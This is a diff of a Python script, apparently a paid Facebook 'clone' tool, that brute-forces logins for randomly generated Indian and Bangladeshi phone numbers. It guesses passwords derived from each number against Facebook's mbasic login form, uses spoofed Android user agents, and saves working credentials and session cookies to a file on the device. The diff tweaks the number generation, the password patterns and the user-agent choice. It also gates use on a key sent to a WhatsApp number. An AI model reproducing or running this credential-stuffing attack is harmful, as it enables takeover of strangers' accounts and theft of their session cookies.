@@ -1,16 +1,17 @@
-import os, sys, uuid, re, random, time, string, json,base64
+import os, sys, uuid, re, random, time, string, json, base64
 from io import BytesIO
+
 try:
-    
-    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-    import requests, rich,certifi,pycurl
+
+    os.system(
+        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+    import requests, rich, certifi, pycurl
 except:
     os.system("git pull")
-    
-    os.system("pip3 install requests rich certifi pycurl")
-    
-    import requests, rich,certifi,pycurl
 
+    os.system("pip3 install requests rich certifi pycurl")
+
+    import requests, rich, certifi, pycurl
 
 from rich import print
 from datetime import datetime
@@ -43,13 +44,9 @@ class sort:
         return cx
 
 
-
-
-
 def info():
     sort.clear()
-    print('[b][red1]WELCOME TO MY TOOL          ')
-    time.sleep(3)
+    print('     [b]    [red1] WELCOME TO MY TOOL          ')
     if not os.path.exists('device_info.txt'):
         os.system('clear')
         print(sort.logo())
@@ -109,11 +106,12 @@ def ua():
     xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
     return xx
 
-#"Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
 
-#Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
+# "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
 
-#Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]
+# Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
+
+# Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]
 
 
 for brand in range(1000):
@@ -123,17 +121,21 @@ for brand in range(1000):
     b = random.choice(
         ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
          'W', 'X', 'Y', 'Z'])
-    c = str(random.randint(1,9))
-    d= str(random.randint(10,20))
-    abc = a+b+c
+    c = str(random.randint(1, 9))
+    d = str(random.randint(10, 20))
+    abc = a + b + c
     if not os.path.exists('device_info.txt'):
-         info()
+        info()
     else:
         infos = open('device_info.txt', 'r').read()
         version_, model_, brand_name_, width_, height_ = infos.split('$')
-        uaaa = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/"+abc+"A."+str(random.randint(190000,199999))+".0"+d+") [FBAN/Orca-Android;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(390000000,399999999))+";FBCR/MTN;FBMF/"+brand_name_+";FBBD/"+brand_name_+";FBDV/"""+model_+";FBSV/"+version_+";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width="+width_+",height="+height_+"};FB_FW/1;]"
+        uaaa = "Dalvik/2.1.0 (Linux; U; Android " + version_ + "; " + model_ + " Build/" + abc + "A." + str(
+            random.randint(190000, 199999)) + ".0" + d + ") [FBAN/Orca-Android;FBAV/" + str(
+            random.randint(200, 350)) + "." + str(random.randint(0, 1)) + ".0." + str(
+            random.randint(20, 70)) + "." + str(
+            random.randint(110, 280)) + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + str(random.randint(390000000,
+                                                                                                        399999999)) + ";FBCR/MTN;FBMF/" + brand_name_ + ";FBBD/" + brand_name_ + ";FBDV/""" + model_ + ";FBSV/" + version_ + ";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=" + width_ + ",height=" + height_ + "};FB_FW/1;]"
         sys_ua.append(uaaa)
-    
 
 
 def Samsung():
@@ -180,6 +182,7 @@ def Vivo():
 
     return ua
 
+
 def lsb():
     upper = ''.join(random.choices(string.ascii_uppercase, k=6))
     lower = ''.join(random.choices(string.ascii_lowercase, k=4))
@@ -198,6 +201,7 @@ def referer():
     password_list = list(password)
     random.shuffle(password_list)
     return ''.join(password_list)
+
 
 # -----------#
 
@@ -431,7 +435,8 @@ def ran():
     if ask in ["1", "01", "a", "A"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
+        print(
+            "[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
@@ -444,7 +449,7 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01718702440")
+        print("[b]     [red1]✗ [chartreuse1]Type A 4 Digit Sim Code EX   [orange3]▶  [chartreuse1]0171, 0185, 0192")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
@@ -452,7 +457,7 @@ def ran():
         print(sort.line())
 
         for i in range(limit):
-            data = str(int(code) + i)
+            data = str(random.choice(range(1000000, 9999999)))
             user.append(data)
     print(" Method 1(Best)")
     print(" Method 2")
@@ -474,8 +479,8 @@ def ran():
         fb = "free"
     else:
         fb = "mbasic"
-    
-    with ThreadPool(max_workers=30) as heron:
+
+    with ThreadPool(max_workers=20) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -485,11 +490,13 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 uid = "91" + xd
             else:
-                uid = "0" + xd
+                uid = code + xd
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]]#, "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[1:],
+                       uid[3:]]  # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -498,7 +505,8 @@ def ren_sub(uid, pwx, meth, user, fb):
     shadid = random.choice(sys_ua)
     custom_agent = ""
     session = requests.Session()
-    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
+    sys.stdout.write(
+        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -508,7 +516,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = Samsung()
+            uax = Vivo()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -545,25 +553,28 @@ def ren_sub(uid, pwx, meth, user, fb):
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                xx=coki.split("c_user=")[1]
-                xd=xx[:15]
-                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}")
-                open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
-                oks.append(xd)
-                break
-                    
-            elif "checkpoint" in heron_brand:
-                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                xx = coki.split("c_user=")[1]
+                xd = xx[:15]
+                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
+                if "height" in res["data"]:
+                    print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
+                    open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                    oks.append(xd)
+                    break
+                else:
+                    pass
 
-                #print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
+
+            elif "checkpoint" in heron_brand:
                 pass
+
+                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
             else:
                 continue
         loop += 1
     except Exception as e:
         time.sleep(30)
-
 
 
 def main():
@@ -643,17 +654,19 @@ def login(uid, meth):
     except:
         time.sleep(30)
 
-K1=str(os.getuid())
-K2=str(os.getgid())
-num_key="".join(K1+K2)
 
-cm=num_key.encode("ASCII")
-cmr=base64.b64encode(cm)
-cm2=str(cmr).upper().replace("B","$")
-showkey=cm2.replace("'","").replace("==","")
+K1 = str(os.getuid())
+K2 = str(os.getgid())
+num_key = "".join(K1 + K2)
+
+cm = num_key.encode("ASCII")
+cmr = base64.b64encode(cm)
+cm2 = str(cmr).upper().replace("B", "$")
+showkey = cm2.replace("'", "").replace("==", "")
+
 
 def approve():
-    url="https://github.com/Shadid21/Prince/blob/main/approval.txt"# Your Link
+    url = "https://github.com/Shadid21/Prince/blob/main/approval.txt"  # Your Link
     try:
         buffer = BytesIO()
         curl = pycurl.Curl()
@@ -662,20 +675,23 @@ def approve():
         curl.setopt(curl.CAINFO, certifi.where())
         curl.perform()
         curl.close()
-        datax=buffer.getvalue().decode('utf-8')
+        datax = buffer.getvalue().decode('utf-8')
     except:
         sys.exit("[!!] Internet Error...")
-    
+
     if showkey in datax:
         sort.clear()
         print("Checking Subscription")
-        time.sleep(3)
+        time.sleep(5)
         main()
     else:
         sort.logo()
-        
-        print("your Key ->   "+showkey)
+
+        print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
+        os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
+
+
 approve()
